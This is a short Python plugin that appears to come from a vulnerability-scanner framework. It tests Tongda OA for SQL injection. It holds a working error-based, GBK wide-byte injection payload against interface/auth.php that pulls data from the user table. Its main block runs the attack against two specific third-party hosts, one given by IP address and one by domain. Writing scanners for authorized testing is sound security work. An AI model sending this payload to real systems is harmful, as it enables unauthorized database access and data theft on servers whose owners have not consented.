#!/usr/bin/python
#-*- encoding:utf-8 -*-
# title:通达oa系统SQL注入

def assign(service, arg):
    if service == "tongdaoa":
        return True, arg


def audit(arg):
    payload = 'interface/auth.php?&PASSWORD=1&USER_ID=%df%27%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(0x3a,md5(1122),0x3a)%20from%20user%20limit%201),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a)%23'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and '3b712de48137572f3849aabd5666a4e3' in res:
        #如果EXT_USER在返回值里，那么USER_ID=存在注入
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://122.144.134.79/')[1])
    audit(assign('tongdaoa', 'http://chc.eup.cn:88/')[1])